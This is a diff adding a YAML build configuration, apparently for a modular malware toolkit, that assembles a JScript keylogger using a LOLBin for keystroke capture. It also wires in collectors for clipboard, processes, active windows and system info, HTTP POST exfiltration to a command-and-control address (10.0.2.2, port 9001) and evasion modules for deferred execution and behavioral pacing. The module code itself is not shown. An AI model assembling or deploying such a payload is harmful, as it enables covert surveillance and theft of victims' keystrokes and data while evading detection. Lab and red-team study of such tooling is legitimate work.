@@ -1,0 +1,28 @@
+name: js_keylogger_lolbin
+description: JScript keylogger using LOLBin keystroke capture method
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/active_windows
+  - collectors/clipboard
+
+keylogger: collectors/keylogger_lolbin
+
+exfil: exfil/http_post
+arch: arch/keylogger
+
+evasion:
+  - evasion/deferred_exec
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  KEYLOG_DURATION: "30"
